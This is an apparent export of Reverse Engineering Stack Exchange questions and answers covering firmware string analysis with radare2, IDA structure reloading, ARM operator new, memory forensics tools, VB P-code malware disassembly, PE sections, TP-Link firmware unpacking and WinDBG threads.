00002ee0  64 21 09 f0 13 fd 08 46  0a 21 09 f0 0f fd 10 30  |d!.....F.!.....0|
00002ef0  14 21 48 43 42 19 01 21  25 20 fd f7 5b fe 73 e0  |.!HCB..!% ..[.s.|
00002f00  68 e2 88 e0 57 41 54 54  0a 00 00 00 4d 4f 44 45  |h...WATT....MODE|
00002f10  0a 00 00 00 7c db 00 00  88 db 00 00 54 45 4d 50  |....|.......TEMP|
00002f20  0a 00 00 00 4d 45 4d 4f  52 59 0a 00 20 4d 4f 44  |....MEMORY.. MOD|
00002f30  45 20 0a 00 ac 01 00 20  53 54 52 45 4e 47 54 48  |E ..... STRENGTH|
00002f40  0a 00 00 00 3c 0b 00 20  20 4d 49 4e 20 0a 00 00  |....&lt;..  MIN ...|
00002f50  53 4f 46 54 0a 00 00 00  4e 4f 52 4d 0a 00 00 00  |SOFT....NORM....|
00002f60  48 41 52 44 0a 00 00 00  20 4d 41 58 20 0a 00 00  |HARD.... MAX ...|
00002f70  ea cf 00 00 42 4c 55 45  54 4f 4f 54 48 0a 00 00  |....BLUETOOTH...|
00002f80  20 20 20 4f 4e 20 20 20  20 0a 00 00 20 20 20 4f  |   ON    ...   O|
00002f90  46 46 20 20 20 0a 00 00  ea d0 00 00 20 20 20 4c  |FF   .......   L|
00002fa0  45 44 20 20 20 0a 00 00  6a d1 00 00 53 54 45 41  |ED   ...j...STEA|
00002fb0  4c 54 48 0a 00 00 00 00  20 4f 46 46 20 20 0a 00  |LTH..... OFF  ..|
00002fc0  20 20 4f 4e 20 20 0a 00  20 20 54 4f 44 41 59 20  |  ON  ..  TODAY |
00002fd0  20 0a 00 00 80 96 98 00  f6 e1 00 00 83 e5 00 00  | ...............|
00002fe0  a0 86 01 00 10 27 00 00  21 46 38 6a 09 f0 8e fc  |.....'..!F8j....|
00002ff0  0a 21 09 f0 8b fc 10 31  14 20 41 43 4a 19 01 21  |.!.....1. ACJ..!|
</code></pre>

<p>another group of ASCII strings elsewhere in the binary:</p>

<pre><code>00004f70  84 e0 04 f0 40 fe 00 28  13 d0 00 20 03 f0 ec ff  |....@..(... ....|
00004f80  1e 49 80 31 08 69 88 61  35 4a 90 42 00 d3 8c 61  |.I.1.i.a5J.B...a|
00004f90  88 69 08 62 33 48 06 23  04 22 00 90 19 46 00 20  |.i.b3H.#.""...F. |
00004fa0  62 e0 6b e0 20 43 48 45  43 4b 20 20 0a 00 00 00  |b.k. CHECK  ....|
00004fb0  41 54 4f 4d 49 5a 45 52  0a 00 00 00 f6 e0 00 00  |ATOMIZER........|
00004fc0  28 03 00 20 ac 01 00 20  7a e0 00 00 20 20 43 48  |(.. ... z...  CH|
00004fd0  45 43 4b 20 20 0a 00 00  10 4b 00 00 ba e0 00 00  |ECK  ....K......|
00004fe0  44 4f 4e 27 54 0a 00 00  41 42 55 53 45 0a 00 00  |DON'T...ABUSE...|
00004ff0  50 52 4f 54 45 43 54 53  21 0a 00 00 3c 0b 00 20  |PROTECTS!...&lt;.. |
00005000  20 57 41 54 54 20 0a 00  2c 2f 00 00 60 ea 00 00  | WATT ..,/..`...|
00005010  36 e1 00 00 2d 53 48 4f  52 54 2d 20 0a 00 00 00  |6...-SHORT- ....|
00005020  b2 eb 00 00 88 13 00 00  20 53 48 4f 52 54 20 20  |........ SHORT  |
00005030  0a 00 00 00 81 0b 00 00  49 53 20 4e 45 57 0a 00  |........IS NEW..|
00005040  43 4f 49 4c 3f 20 0a 00  59 0a 00 00 4e 0a 00 00  |COIL? ..Y...N...|
00005050  7c db 00 00 88 db 00 00  dc 05 00 00 a0 db 00 00  ||...............|
00005060  0f 27 00 00 94 db 00 00  fb f7 e0 fd 28 46 fd f7  |.'..........(F..|
00005070  a1 f8 fb f7 f0 fe 07 20  fd f7 08 fb af 20 fb f7  |....... ..... ..|
00005080  2f ff 00 20 fb f7 30 ff  38 bd ff 49 08 60 70 47  |/.. ..0.8..I.`pG|
00005090  fe 49 88 72 70 47 fd 48  80 7a 70 47 10 b5 13 24  |.I.rpG.H.zpG...$|
</code></pre>

<p>more ASCII strings elsewhere:</p>

<pre><code>00005490  44 2f 00 00 34 0c 00 20  a0 db 00 00 88 db 00 00  |D/..4.. ........|
000054a0  94 db 00 00 7c db 00 00  ea d5 00 00 36 0a 00 00  |....|.......6...|
000054b0  2e 0a 00 00 50 4f 57 45  52 0a 00 00 20 4f 46 46  |....POWER... OFF|
000054c0  20 0a 00 00 20 20 4f 4e  20 0a 00 00 e7 03 00 00  | ...  ON .......|
000054d0  0f 27 00 00 9f 86 01 00  33 08 00 00 5f db 00 00  |.'......3..._...|
000054e0  fb f7 a4 fb fd 49 20 68  07 f0 10 fa 7d 27 08 46  |.....I h....}'.F|
000054f0  ff 00 39 46 07 f0 0a fa  f9 4e 00 01 80 19 01 22  |..9F.....N.....""|
</code></pre>

<p>There are several more such clusters of ASCII strings in different parts of the file. Some of the ASCII strings are mentioned in the <a href=""http://7xjcby.com2.z0.glb.qiniucdn.com/file/14649402661940c5xxzme3pi4quxr.png"" rel=""nofollow noreferrer"">product manual</a>:</p>

<p><a href=""https://i.stack.imgur.com/Sr1Ox.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Sr1Ox.png"" alt=""strings in product manual""></a></p>

<p>However, many of the ASCII strings in the binary are not mentioned in the manual, such as these:</p>

<pre><code>00009d00  21 b0 f0 bd 00 01 00 50  00 ff 01 00 b4 ed 00 00  |!......P........|
00009d10  43 12 67 00 45 52 52 4f  52 3a 20 20 20 0a 00 00  |C.g.ERROR:   ...|
00009d20  4e 4f 20 53 45 43 52 45  54 0a 00 00 2d 4b 45 59  |NO SECRET...-KEY|
00009d30  21 20 20 20 20 0a 00 00  ef 48 00 68 c0 07 c0 0f  |!    ....H.h....|
</code></pre>

<p>Visualization of the binary also shows that byte sequences that fall within the <a href=""http://www.asciitable.com/"" rel=""nofollow noreferrer"">ASCII range</a> are scattered throughout the binary (blue is ASCII):</p>

<p><a href=""https://i.stack.imgur.com/9yJuK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9yJuK.png"" alt=""binary visualization by byteclass""></a></p>

<p><strong>2. Taking the locale the firmware was developed in into consideration</strong></p>

<p>The firmware, the upgrade tool and the microcontroller are all developed by Nuvoton, a Taiwanese company. Perhaps there are sequences of traditional Chinese characters in the binary as well.</p>

<p>By default, <code>strings</code> searches for ASCII character sequences and the -C option for <code>hexdump</code> prints bytes within the ASII range as ASCII characters. But what if there are <a href=""https://docs.python.org/3/howto/unicode.html"" rel=""nofollow noreferrer"">Unicode</a>-encoded strings in the binary in addition to ASCII-encoded strings? Radare2 can be used to search for strings in the hex file directly, rather than relying on the output of a different tool (<a href=""https://www.suse.com/communities/blog/making-sense-hexdump/"" rel=""nofollow noreferrer"">hexdump is pretty flexible</a> but it is faster to use radare2). To search for strings, the <a href=""https://github.com/pwntester/cheatsheets/blob/master/radare2.md"" rel=""nofollow noreferrer""><code>izz</code></a> commands will be used to search for strings throughout the binary:</p>

<pre><code>$ r2 ihex://SMOK_X_CUBE_II_firmware_v1.07.hex
 -- I am Pentium of Borg. Division is futile. You will be approximated.
[0x00000000]&gt; izz
Do you want to print 1444 lines? (y/N)   &lt;--- enter ""y"", obviously
</code></pre>

<p>This has some potentially interesting results:</p>

<pre><code>vaddr=0x0000aa95 paddr=0x0000aa95 ordinal=1093 sz=28 len=13 section=unknown type=wide string=h(胐恇ԇӕ栠だi(胐⁇ԇ
vaddr=0x0000aab5 paddr=0x0000aab5 ordinal=1094 sz=54 len=26 section=unknown type=wide string=i(胐ⱇ潩ᄆHhШ⣐ࡉ⡀ѡ⣠ũड蠅⡃灡h(胐
vaddr=0x0000aaef paddr=0x0000aaef ordinal=1095 sz=10 len=4 section=unknown type=wide string=Hh̨⣐
vaddr=0x0000ab07 paddr=0x0000ab07 ordinal=1096 sz=62 len=30 section=unknown type=wide string=h(胐ᄆ탕HhШ棐칩ࡉ桀ѡ棠ũड蠅桃灡i(胐༂웕Hh̨棐
vaddr=0x0000ab53 paddr=0x0000ab53 ordinal=1097 sz=70 len=34 section=unknown type=wide string=i(胐삵汍쁨ԇǐ栠だh(胐ꁇԇ˕栠끠h(胐恇ԇӕ栠だi(胐⁇ԇ
vaddr=0x0000ab9d paddr=0x0000ab9d ordinal=1098 sz=58 len=28 section=unknown type=wide string=i(胐ⱇ潩ᄆ꧕HhШ⣐ꡩࡉ⡀ѡ⣠ũड蠅⡃灡h(胐ꈂཌ
vaddr=0x0000abd7 paddr=0x0000abd7 ordinal=1099 sz=10 len=4 section=unknown type=wide string=Hh̨⣐
vaddr=0x0000abef paddr=0x0000abef ordinal=1100 sz=62 len=30 section=unknown type=wide string=h(胐ᄆ雕HhШ棐鑩ࡉ桀ѡ棠ũड蠅桃灡i(胐༂賕Hh̨棐
vaddr=0x0000ac3b paddr=0x0000ac3b ordinal=1101 sz=22 len=10 section=unknown type=wide string=i(胐袽腈ཨሢᄅ腃
</code></pre>

<p>I cannot read these characters, so I do not know what language they are from. Maybe it is just gibberish.</p>

<p><strong>3. Using a hex editor</strong></p>

<p>A <a href=""http://home.gna.org/bless/"" rel=""nofollow noreferrer"">hex editor with a GUI</a> can be used to quickly search for patterns in the data. For example, the byte <code>0A</code> looks like it is used as a terminating character for ASCII strings:</p>

<p><a href=""https://i.stack.imgur.com/QUDZQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/QUDZQ.png"" alt=""0A ASCII string terminating character""></a></p>

<h3>Disassembly</h3>

<p>So how should the binary be disassembled using r2? Are any there any special arguments or commands for 16-bit ARM Thumb instructions + some 32-bit Thumb2 instructions? </p>

<p>From <a href=""https://github.com/radare/radare2/issues/3433"" rel=""nofollow noreferrer"">How to disassemble to ARM UAL?</a>:</p>

<blockquote>
  <p>-b16 is asumed for thumb, not because the instruction size or the register size. Its an exception to make things simpler. Because its
  just a mode of the cpu.</p>
  
  <p>-b16 sets thumb2 mode in capstone disassembler (as well as in gnu). Thumb2 contains 2 byte and 4 byte instruction lengths. Thumb was only
  2. But thumb and thumb2 are binarynl compatible, so it makes sense to use thumb2 here, unless the cpu doesnt supports it.</p>
  
  <p>From what i understand from ual is that this ist just a syntax, and
  this symtax should be ready in capstone.</p>
  
  <p>Capstone knows nothing about code or data. It just disassembles.</p>
</blockquote>

<p>In order to properly disassemble the file, it is critical that the correct architecture is specified:</p>

<blockquote>
  <p>-b bits     force asm.bits (16, 32, 64)</p>
</blockquote>

<p>For this firmware binary, <code>-b 16</code> should be used, <strong>not <code>-b 32</code></strong>: </p>

<p><code>$ r2 -a arm -b 16 ihex://SMOK_X_CUBE_II_firmware_v1.07.hex</code>  </p>

<p>If <code>-b 32</code> is used, the result is quite a bit of byte sequences r2 reads as invalid due to misalignment:
<a href=""https://i.stack.imgur.com/nibzc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/nibzc.png"" alt=""invalid disassembly""></a></p>

<p>For reference, here is disassembly beginning at the same offset, <code>0x1e8</code>, with proper 16-bit alignment:</p>

<p><a href=""https://i.stack.imgur.com/yx854.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yx854.png"" alt=""less invalid disassembly""></a></p>

<p>Obviously this is totally different.</p>

<p>It is important to emphasize that the entire binary will be disassembled as executable code, including data such as the ASCII and Unicode byte sequences. This must be taken into consideration when analyzing the disassembled output. </p>

<p>To analyze the disassembled code, one must be familiar with ARM assembly.</p>

<h3>Additional Considerations</h3>

<ul>
<li>The ISP upgrade tool is a MS Windows PE32 executable binary. This can be reverse engineered to determine how the flashing process takes place.</li>
<li>Physical access to the microcontroller could be useful. The entire contents of flash memory could be dumped and analyzed. This would also enable one to see exactly how everything is laid out in flash memory</li>
<li>if known good blocks of code can be isolated, it my be possible to decompile it</li>
</ul>

<h1>Conclusion</h1>

<p>Hopefully the approach used here proves useful for your future firmware RE endeavors. Analyzing firmware poses its own set of challenges because of the close relationship between it and it the hardware it is designed to be embedded in. Since the design and architecture of the device determines the layout and content of firmware, firmware sometimes cannot be reversed without access to the device, or at the very least knowing the instruction set architecture of the device.</p>
","15025"
"How to let IDA reload a structure from a C file?","2030","","<p>I manage my structures in C files, the header might look like this:</p>

<pre><code>#pragma pack(0)

typedef struct
{
    short important_value;
    char  _A[2]; // unknown
    int   interesting_value;
} STRUCT;
</code></pre>

<p>I loaded this into IDA via <kbd>Ctrl</kbd>+<kbd>F9</kbd>. Now I find out more about the structure, seeing that <code>_A</code> contains <code>short imaginary_value</code>.</p>

<p>When I try to reload this in IDA via <kbd>Ctrl</kbd>+<kbd>F9</kbd>, nothing happens. When I delete the structure in IDA, parse the C file and re-create the structure, I see the new structure, however all instances of <code>STRUCT</code> in the database are deleted.</p>

<p>So the question is, how do I reload the structure without removing all instances from the database.</p>
","<p>Go to the <code>Local Types</code> (<code>View-&gt;Open Subviews-&gt;Local Types</code> or <kbd>Shift</kbd> + <kbd>F1</kbd>) window and then edit it from there by right clicking and clicking on <code>edit</code> on your structure's entry on the list.</p>
","2179"
"What is operator new(unsigned int)?","2030","","<p>In the disassembler output (ARM) I see:</p>

<pre><code>    BLX _Znwj
</code></pre>

<p>where <code>BLX</code> is ARM procedure call and <code>_Znwj</code> is demangled as</p>

<pre><code>$ c++filt  _Znwj
operator new(unsigned int)
</code></pre>

<p>What does that <code>operator new</code> do? Is it <code>new</code> or <code>new[]</code>?
What type does it return?
How do I explicitly call it from C++, something in the <code>operator+(a,b)</code> style?</p>

<p>(I know that it is possible to define <code>operator new</code> in a class, but this looks a bit different.)</p>
","<p>A runtime function does not necessarily convert to a C++ function. For example, on a processor that has no floating point hardware, a simple statement like</p>

<pre><code>a=b+c;
</code></pre>

<p>with <code>a</code>, <code>b</code> and <code>c</code> being floats, will probably be converted to a function call that takes <code>b</code> and <code>c</code> as parameters and returns the results. The user is not supposed to call that function directly.</p>

<p>In your case, consider that every <code>new</code> probably maps to something that allocates memory and calls a constructor function, and every <code>new[]</code> allocates memory for several elements and calls a constructor function on each element. The <code>new</code> <code>_Znwj</code> function is the memory allocator used internally by the <code>new</code> operator (at least if you're using <code>gcc</code>, which I assume), and it's not intended to be called directly from C++.</p>

<p>This program:</p>

<pre><code>    class Foo {
            int bar;
    };

    int main(void) {
            Foo *baz=new Foo();
            Foo *var=new Foo[20];
    }
</code></pre>

<p>Compiles to (try <code>gcc -S</code>):</p>

<pre><code>    stmfd   sp!, {fp, lr}
    .save {fp, lr}
    .setfp fp, sp, #4
    add     fp, sp, #4
    .pad #8
    sub     sp, sp, #8
    mov     r0, #4                &lt;-- 4 bytes for single variable
    bl      _Znwj
    mov     r3, r0                &lt;-- r0 returns the pointer to the allocated memory
    mov     r2, #0
    str     r2, [r3]
    str     r3, [fp, #-8]
    mov     r0, #80               &lt;-- 80 bytes (20*4) for array
    bl      _Znaj
    mov     r3, r0                &lt;-- r0 returns the pointer to the allocated memory
    str     r3, [fp, #-12]
    mov     r3, #0
    mov     r0, r3
    sub     sp, fp, #4
    @ sp needed
    ldmfd   sp!, {fp, lr}
    bx      lr
</code></pre>

<p>So, you see that the <code>_Znwj</code> resp. <code>_Znaj</code> are the allocator functions for a single class resp. an array of classes, both of them take the number of bytes required as parameter, and both of them return a pointer to the allocated memory as result.</p>

<p>To answer your questions:</p>

<ol>
<li><p><strong>What does that operator <code>new</code> do ?</strong></p>

<p>It allocates memory for a new class instance.</p></li>
<li><p><strong>Is it <code>new</code> or <code>new[]</code> ?</strong></p>

<p><code>_Znwj</code> is <code>new</code>, and <code>_Znaj</code> is <code>new[]</code>.</p></li>
<li><p><strong>What type does it return ?</strong></p>

<p>It returns the address of the newly allocated memory block. In C++, the closest match to resemble that would be a <code>void *</code>, but note it's supposed to point to a class structure.</p></li>
<li><p><strong>How do I explicitly call it from C++, something in the <code>operator+(a,b)</code> style ?</strong></p>

<p>You're not supposed to do that. You use <code>new</code> or <code>new[]</code>. I assume the makers of <code>gcc</code> explicitly used a function name that cannot, normally, be called from a C++ program without a syntax error due to the name conflict.</p></li>
</ol>
","4405"
"tools - Free Windows Memory Toolkit for x64","2028","","<p>I have seen the Moonsols Memory Toolkit for Windows (Community Edition). It however does not support x64 memory dumping. Only its professional version can do that. Are there any free alternatives out there that do the same ? To narrow down what I am looking for I would be interested in features like -:</p>

<ul>
<li><p>Convert a memory dump from a x64 Architecture.</p></li>
<li><p>Convert or decompress Windows 7 hibernation files.</p></li>
<li>Convert a Windows 7 memory dump.</li>
</ul>

<p>I have seen a lot of free tools for x86, but for x64 its a whole different ball game.</p>
","<p><a href=""http://code.google.com/p/volatility/"" rel=""nofollow"">Volatility</a> supports x64 Windows 7 hibernation files as well as x64 images.</p>
","6747"
"Unpacking a program which seems to be not packed?","2024","","<p>I have downloaded a sample of a malware to analyze it. First, I opened it with PEiD to look if it is packed. 
PEiD gives me the following information:</p>

<pre><code>   Microsoft Visual Basic 5.0/6.0
</code></pre>

<p>So, I assumed that it is not packed. 
When I opened it using ollydbg shows me the following lines:</p>

<pre><code>   PUSH malware.00401F8C
   CALL &lt;JMP.&amp;MSVBVM60.#100&gt;
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   INC EAX
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   DB 00
   DB 1D
   ....
   ....
</code></pre>

<p>So, normally it should start with a function prologue(the typical beginning line with PUSH EBP and so on) but although it is not packed, obviously the program tries to make the analyzing process harder (for me). 
When I step to the second line( CALL &lt;...>), then the process begins to run and does not stop. In my previous cases, I have only unpacked malware samples that were packed with UPX. So, a piece of code like that above is completely new for me. So:</p>

<p>How should I solve this? Can someone give me an advice how I can handle that?</p>

<p>best regards, </p>
","<p>Your program is not packed, but rather compiled as <a href=""http://www.woodmann.com/crackz/Tutorials/Vbpcode.htm"" rel=""nofollow noreferrer"">Visual Basic P-code</a> or Visual Basic native code.</p>

<p>If it's VB native code, you can use your favorite debugger (OllyDbg, IDA, etc.) to debug it, and IDA to disassemble it.</p>

<p>If it's VB P-code, you can use <a href=""http://www.vb-decompiler.org/"" rel=""nofollow noreferrer"">VB Decompiler Pro</a> to disassemble/decompile it:
<img src=""https://i.stack.imgur.com/ofVTM.png"" alt=""VB Decompiler Pro""></p>

<p>... and <a href=""http://blackfenix.fortunecity.ws/wktvbdebug/index.html"" rel=""nofollow noreferrer"">WKTVBDE</a> to debug it:
<img src=""https://i.stack.imgur.com/gkZov.jpg"" alt=""enter image description here""></p>

<p>Note that VB Decompiler Pro is useful even for statically analyzing VB native code.</p>
","6516"
"Examining memory in radare2","2016","","<p>How can I examine a memory address in radare2 using registers? I would like to achive what this command does in gdb: <code>x/s $ebp+0x4</code></p>
","<pre><code>[0x080495e0]&gt; x/8x @0x80483d0
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x080483d0  7275 6e20 6173 202e                      run as .
[0x080495e0]&gt; x/8s @0x80483d0
run as ./prog a_number (e.g. ./prog 90)
good.
bad.
[0x080495e0]&gt;
</code></pre>

<p>radare2 -d xxxx\calc.exe </p>

<pre><code>[0x7c999712]&gt; dr ebp
0x0007fd14
[0x7c999712]&gt; x/16x @ebp+0x48
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0007fd5c  7d4c 5480 0000 0000 3400 00c0 a8a0 128a  }LT.....4.......
[0x7c999712]&gt; x/s @ebp+0x48
}LT
4
[0x7c999712]&gt;
</code></pre>
","11590"
"PE .rdata section contents","2010","","<p>According to MSDN, the <code>.rdata</code> section of a PE should contain the debug directory and the description string. I've read elsewhere that it contains read-only program data. Dumping several files, I found that <code>.rdata</code> contains the IAT, load configuration table, and safe exception handler table. Can someone please clarify the purpose of <code>.rdata</code> and why what I find in there disagrees with both descriptions? Also, shouldn't the import information be in <code>.idata</code>?</p>

<p>I'm assuming different compilers and different versions of the same compiler treat the same sections differently. If that's the case, where can I get more information on this?</p>
","<p>It is <strong>customary</strong> for read-only data of all kinds to be lumped into .rdata. However, that's a matter of expedience, not necessity. Compiler and linker can put any data anywhere they like, as long as it is referenced correctly in the data directory.</p>

<p>The first point of call should be Microsoft's <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">PE COFF specification</a> (currently v8.3). Remarks and pointers regarding the divergence between theory and practice can be found <a href=""https://reverseengineering.stackexchange.com/questions/6874/is-not-valid-win32-application-why/6878#6878"">in another topic</a> here on RE.</p>

<p>If you just want to extract/parse the information then you can ignore the section names completely; just use the info in the data directory.</p>
","6942"
"Reverse engineering TP-Link TD-W8961N","2005","","<p>After following the tutorial <a href=""http://www.devttys0.com/2011/05/reverse-engineering-firmware-linksys-wag120n/"" rel=""nofollow"">here</a>, I decided I would try and reverse engineer my router's firmware. My router is the TP-Link TD-W8961N and the firmware version is V2.</p>

<p>I have been trying to figure this out for a while now, but have had no luck. The firmware does not contain any obvious filesystem, bootloader or kernel that can be extracted. </p>

<p>From the binwalk analysis, it seems that the router is running ThreadX on MIPS architecture. </p>

<p>Executing <code>binwalk -eM TDW8961N</code>, I get</p>

<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
63643         0xF89B          ZyXEL rom-0 configuration block, name: ""dbgarea"", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
63892         0xF994          ZyXEL rom-0 configuration block, name: ""dbgarea"", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
85043         0x14C33         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 66696 bytes
118036        0x1CD14         Unix path: /usr/share/tabset/vt100:\
118804        0x1D014         ZyXEL rom-0 configuration block, name: ""spt.dat"", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
118824        0x1D028         ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 16
128002        0x1F402         GIF image data, version ""89a"", 200 x 50
136194        0x21402         GIF image data, version ""89a"", 560 x 50
253333        0x3DD95         Neighborly text, ""neighbor of your ADSL Router that will forward the packet to the destination. On the LAN, the gateway &lt;/font&gt;e destination. On the LAN, the gateway &lt;/font&gt;""
349586        0x55592         Copyright string: ""Copyright (c) 2001 - 2015 TP-LINK TECHNOLOGIES CO., LTD.""
386471        0x5E5A7         Copyright string: ""Copyright &amp;copy; 2015 TP-LINK Technologies Co., Ltd. All rights reserved.""
386489        0x5E5B9         TP-Link firmware header, firmware version: 17256.26992.22113, image version: "" Co., Ltd. All rights reserved."", product ID: 0x6E42746E, product version: 1131375727, kernel load address: 0x72002223, kernel entry point: 0x46463939, kernel offset: 4475203, kernel length: 1347765096, rootfs offset: 1768969317, rootfs length: 2020868163, bootloader offset: 1347747908, bootloader length: 1229148245
806847        0xC4FBF         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2853276 bytes


Scan Time:     2016-10-07 22:29:27
Target File:   /home/aaron/Desktop/tools/firmware/TD-W8961N/_TD-W8961N-0.extracted/14C33
MD5 Checksum:  feac8e40efcca119826f811501b36502
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2016-10-07 22:29:27
Target File:   /home/aaron/Desktop/tools/firmware/TD-W8961N/_TD-W8961N-0.extracted/C4FBF
MD5 Checksum:  78c0c10cba8fba3ce1c194461ac40fa4
Signatures:    344

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2141288       0x20AC68        Neighborly text, ""neighbor loss) fail""
2144380       0x20B87C        ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 8313
2157896       0x20ED48        Neighborly text, ""neighbordown: can't shutdown OSPF task completely""
2168474       0x21169A        ZyXEL rom-0 configuration block, name: ""spt.dat"", compressed size: 769, uncompressed size: 259, data offset from start of block: 28805
2249704       0x2253E8        HTML document footer
2250021       0x225525        HTML document header
2253724       0x22639C        XML document, version: ""1.0""
2320029       0x23669D        Base64 standard index table
2332534       0x239776        ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 131
2332646       0x2397E6        Copyright string: ""Copyright (c) 1994 - 2004 ZyXEL Communications Corp.""
2332699       0x23981B        Copyright string: ""Copyright (c) 2001 - 2006 TrendChip Technologies Corp.""
2332754       0x239852        Copyright string: ""Copyright (c) 2001 - 2006 ""
2333095       0x2399A7        ZyXEL rom-0 configuration block, name: ""dbgarea"", compressed size: 0, uncompressed size: 0, data offset from start of block: 16
2344978       0x23C812        eCos RTOS string reference: ""ecost""
2393676       0x24864C        SHA256 hash constants, big endian
2395752       0x248E68        Base64 standard index table
2436753       0x252E91        ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 135
2454640       0x257470        ZyXEL rom-0 configuration block, name: ""autoexec.net"", compressed size: 25972, uncompressed size: 11886, data offset from start of block: 131
2495500       0x26140C        Base64 standard index table
2537620       0x26B894        XML document, version: ""1.0""
2544124       0x26D1FC        XML document, version: ""1.0""
2545312       0x26D6A0        XML document, version: ""1.0""
2546280       0x26DA68        XML document, version: ""1.0""
2551100       0x26ED3C        XML document, version: ""1.0""
2555276       0x26FD8C        XML document, version: ""1.0""
2558548       0x270A54        XML document, version: ""1.0""
2563936       0x271F60        XML document, version: ""1.0""
2569916       0x2736BC        XML document, version: ""1.0""
2572052       0x273F14        XML document, version: ""1.0""
2579160       0x275AD8        XML document, version: ""1.0""
2595692       0x279B6C        XML document, version: ""1.0""
2605172       0x27C074        XML document, version: ""1.0""
2613932       0x27E2AC        XML document, version: ""1.0""
2615368       0x27E848        XML document, version: ""1.0""
2627752       0x2818A8        XML document, version: ""1.0""
2648491       0x2869AB        Copyright string: ""copyright""
2658067       0x288F13        Copyright string: ""copyright"" &gt;""
2759380       0x2A1AD4        CRC32 polynomial table, big endian
2827145       0x2B2389        Unix path: /wifi_uni_mac/ROM/nic/hal/MT7603/hal_rom.c
2827593       0x2B2549        Unix path: /wifi_uni_mac/ROM/nic/hal/MT7603/hal_pwr_mgt_rom.c
2828329       0x2B2829        Unix path: /wifi_uni_mac/mgmt/mt7603/rlm_phy.c
2828385       0x2B2861        Unix path: /wifi_uni_mac/mgmt/mt7603/rlm_sensor.c
2852324       0x2B85E4        Copyright string: ""Copyright (c) 1996-2010 Express Logic Inc. * ThreadX MIPS32_34Kx/Green Hills Version G5.4.5.0 SN: 3182-197-0401 *""
</code></pre>

<p>This creates two files <code>14C33</code> which, when running binwalk, gives no results and <code>C4FBF</code> which gives a similar output as <code>binwalk TDW8961N</code>. It also creates lots of xml files which are similar. </p>

<p>I opened the files 14C33 and C4FBF in a hex editor and noticed that the first two bytes were <code>3C 08</code>. Running <code>file</code> on these two files returns <br /><br />
<code>14C33: data</code><br />
<code>C4FBF: data</code> <br /></p>

<p>I Googled these two bytes and came to <a href=""https://groups.google.com/forum/#!msg/comp.compression/_y2Wwn_Vq_E/SKOF7iE12PEJ"" rel=""nofollow"">this</a> page where I found that a zlib stream can start with <code>08 3C</code>, although not common. After reading this, I changed the first two bytes so that they read <code>08 3C</code> and <code>file 14C33</code> returned <br /><br />
<code>14C33: zlib compressed data</code> <br /><br /></p>

<p>I did the same thing with the file <code>C4FBF</code> and when I try to decompress it, it fails. Using gzip, I get <code>unknown suffix -- ignored</code>. I also tried with uncompress and pigz, but they gave similar errors.</p>

<p>Is there something wrong with the <code>zlib compressed data</code>, is <code>file</code> giving a false positive or is there a custom compression algorithm? Also, I don't understand why there is a reference to both eCos and ThreadX OSes. And for the bootloader and kernel offset, is it the offset when the bootloader and kernel are loaded into memory?</p>

<p>The firmware can be downloaded at tp-link.com/en/download/TD-W8961N_V2.html#Firmware</p>
","<p>I found the answer. </p>

<p>The router runs ZynOS and needed to be extracted using <a href=""https://github.com/dev-zzo/router-tools"" rel=""nofollow noreferrer"">router-tools</a></p>

<p>Once downloaded, I ran the command<br /></p>

<p><code>python zynos.py unpack TDW8961N</code> to unpack the router frimware. All I had to do now was use <code>binwalk -Y file</code> to find out the architecture and then load the files into IDA and disassemble using</p>

<p><a href=""https://wiki.openwrt.org/doku.php?id=oldwiki:openwrtdocs:hardware:zyxel:p_335wt"" rel=""nofollow noreferrer"">https://wiki.openwrt.org/doku.php?id=oldwiki:openwrtdocs:hardware:zyxel:p_335wt</a> to figure out where to start the ROM.</p>
","13981"
"Three threads in Windows","2002","","<p>I wrote a little program which just shows a dialog. Basically an ASM Hello World. When the dialog is displayed and I break in WinDBG, I can see three threads even though the application doesn't use any threads at all.</p>

<p>I was not aware that there is something like default threads applied to a process, or is this because of WinDBG?</p>

<p>The Process/Thread window shows</p>

<pre><code> 000:13d4:MyApp.exe
    000:d14
    001:11bc
    002:50c
</code></pre>

<p>If I put a memory access breakpoint and the process would have multiple threads, do I have to specify in which thread this should be triggered. I think this shouldn't matter right? So if an address is accessed by any thread, the breakpoint should trigger regardless.</p>

<p><strong>udate</strong></p>

<p>So I took now a closer look (the handle numbers have changed, but the IDs are relevant anyway). I'm Running Windows 7-32bit-x86 if that helps.</p>

<p><code>000:</code> refers to my original process, but this was already known.</p>

<p><code>001:</code> Stacktrace when I break looks like this (some thread snychronization required by WinDBG?):</p>

<pre><code>ntdll!KiFastSystemCallRet
kernel32!WaitForMultipleObjectsEx+0x8e
kernel32!WaitForMultipleObjects+0x18
msiltcfg!RestartMsi+0x32e
